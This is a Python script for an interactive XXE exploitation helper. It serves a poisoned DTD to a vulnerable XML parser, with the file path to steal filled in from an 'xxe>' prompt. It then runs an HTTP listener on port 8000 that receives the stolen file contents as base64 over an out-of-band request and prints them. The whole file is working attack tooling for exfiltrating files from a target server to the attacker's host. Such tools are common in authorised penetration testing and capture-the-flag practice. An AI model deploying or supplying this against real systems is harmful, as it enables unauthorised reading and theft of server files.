import threading
import time
from cmd import Cmd
import http.server
from base64 import b64decode
from urllib.parse import urlparse, parse_qs

from rich.console import Console
from rich.panel import Panel
from rich.text import Text

console = Console()

payload = "Dummy string"

# Some XML parsers resolve the OOB parameter entity twice for a single
# request (once loading the DTD, once expanding it), producing two
# identical requests within milliseconds. Suppress the repeat print.
DEDUPE_WINDOW = 2  # seconds
_seen_content: dict[str, float] = {}

# TODO To parse the .req file, and then get the relevant data and make the request
# TODO Add argparse to get the .req filename dynamically, and also the attacker's IP and port for the OOB request


class RequestHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        with open("server.log", "a") as f:
            f.write(
                "%s - - [%s] %s\n"
                % (self.address_string(), self.log_date_time_string(), format % args)
            )

    def do_GET(self):
        """This function sends a custom poisoned .dtd file, and decodes the response"""
        self.send_response(200)
        self.send_header("Content-Type", "application/xml")
        self.end_headers()

        if self.path.endswith(".dtd"):
            # Make payload for DTD
            self.wfile.write(payload.encode("utf-8"))
            return

        elif "content" in self.path:
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)

            b64_value = params["content"][0]
            now = time.time()
            last_seen = _seen_content.get(b64_value)
            _seen_content[b64_value] = now
            if last_seen is not None and now - last_seen < DEDUPE_WINDOW:
                return

            decoded = b64decode(b64_value).decode()
            print()
            console.print(
                Panel(Text(decoded), title="Decoded Content", border_style="green")
            )
            console.print(terminal.prompt, end="", highlight=False)
            return
        else:
            console.print(f"[yellow]Unintended request:[/yellow] {self.path}")
            console.print(terminal.prompt, end="", highlight=False)
            return


class Terminal(Cmd):
    prompt = "xxe> "

    def default(self, line):
        global payload

        # To update the xxe with the user required file dynamically
        with open("xxe.dtd") as f:
            temp_payload = f.read().replace("{line}", line)

        payload = temp_payload
        # TODO To make the request from here itself, instead of burp
        console.print(f"[cyan]Target file set:[/cyan] {line}")

    def do_exit(self, arg):
        exit()


def run():
    server_address = ("", 8000)
    httpd = http.server.HTTPServer(server_address, RequestHandler)
    httpd.serve_forever()


t = threading.Thread(target=run)
t.daemon = True
t.start()

terminal = Terminal()
terminal.cmdloop()
